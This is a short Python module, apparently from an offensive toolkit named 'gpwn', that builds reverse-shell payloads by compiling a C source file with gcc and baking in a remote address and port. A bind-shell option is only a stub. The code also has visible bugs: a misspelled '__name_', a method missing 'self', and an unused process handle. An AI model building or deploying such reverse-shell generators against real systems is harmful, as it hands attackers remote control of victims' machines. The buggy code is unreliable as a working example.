import logging
from subprocess import Popen, PIPE, check_output

from gpwn.shells import Shell
from gpwn.resources import get_path
from gpwn.exceptions import ShellError

logger = logging.getLogger().getChild(__name_)

class C(Shell):
    def __init__(self, address: str, port: int):
        Shell.__init__(self, address=address, port=port)

    def generate_reverse_shell(self):
        if self.address is None:
            raise ShellError('Missing or invalid address')
        if self.port is None:
            raise ShellError('Missing or invalid port')

        port = self.port
        address = "\"%s\"" % self.address

        pipe = Popen(["gcc", "shell.c", "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-Wno-implicit-function-declaration"])


    def generate_bind_shell():
        logger.info("bind shell no implemented")

